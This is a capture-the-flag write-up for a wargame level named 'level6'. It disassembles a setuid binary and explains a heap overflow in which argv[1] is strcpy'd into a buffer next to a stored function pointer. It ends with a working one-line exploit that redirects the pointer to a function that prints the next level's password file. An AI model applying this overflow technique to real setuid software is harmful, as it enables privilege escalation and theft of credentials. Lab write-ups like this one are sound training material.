# Level6

## Solution

* There is one file in our home, ```level6```, belonging to ```level7``` user, with suid.
* Here's the hand-decompiled source code we propose for this binary: [source.c](source.c)

* Here is the disassembled ```main``` function:
```asm
0x0804847c <+0>:	push   ebp
0x0804847d <+1>:	mov    ebp,esp
0x0804847f <+3>:	and    esp,0xfffffff0
0x08048482 <+6>:	sub    esp,0x20
0x08048485 <+9>:	mov    DWORD PTR [esp],0x40
0x0804848c <+16>:	call   0x8048350 <malloc@plt>
0x08048491 <+21>:	mov    DWORD PTR [esp+0x1c],eax
0x08048495 <+25>:	mov    DWORD PTR [esp],0x4
0x0804849c <+32>:	call   0x8048350 <malloc@plt>
0x080484a1 <+37>:	mov    DWORD PTR [esp+0x18],eax
0x080484a5 <+41>:	mov    edx,0x8048468
0x080484aa <+46>:	mov    eax,DWORD PTR [esp+0x18]
0x080484ae <+50>:	mov    DWORD PTR [eax],edx
0x080484b0 <+52>:	mov    eax,DWORD PTR [ebp+0xc]
0x080484b3 <+55>:	add    eax,0x4
0x080484b6 <+58>:	mov    eax,DWORD PTR [eax]
0x080484b8 <+60>:	mov    edx,eax
0x080484ba <+62>:	mov    eax,DWORD PTR [esp+0x1c]
0x080484be <+66>:	mov    DWORD PTR [esp+0x4],edx
0x080484c2 <+70>:	mov    DWORD PTR [esp],eax
0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>
0x080484ca <+78>:	mov    eax,DWORD PTR [esp+0x18]
0x080484ce <+82>:	mov    eax,DWORD PTR [eax]
0x080484d0 <+84>:	call   eax
0x080484d2 <+86>:	leave
0x080484d3 <+87>:	ret
```

* Several intersting information about it:

	* ```main``` makes two calls to ```malloc```, to allocate respectively ```0x40``` and ```0x4``` bytes.
	* at offsets ```41``` and ```47```, it stores ```0x8048468``` adresss that happens to be ```m``` function in the ```0x4``` bytes allocation.
	* at offset ```73```, it copies the content of ```argv[1]``` (obtained between offsets ```52``` and ```58```) into the ```0x40``` bytes.
	* at offset ```84```, it calls the function which address is contained in the ```0x4``` bytes allocation.

* ```m``` function only outputs ```Nope```

* a third function, ```n```, never called in the program but that we can discover with ```objdump -d level5```, launches ```system("/bin/cat /home/user/level7/.pass")```


* What we did with all of this:

	* as the two allocated zone are almost contiguous in memory, we decided to change the content of the ```0x4``` bytes area (the address of the ```m``` function), and replace it by the address of ```n``` function.
	* as what we write in argument of the program will be finally copied at the ```0x40``` bytes allocation address, we launched the following command:
	```sh
	./level6 `python -c "print('A' * 0x48 + '54840408'.decode('hex'))"`
	```
	* ```0x48``` is the gap between beginning of the ```0x40``` bytes and ```0x4``` bytes allocations
	* ```54840408``` is the littlen endian written address of function ```n```
	* this command finally outputs ```level7``` ```.pass``` file
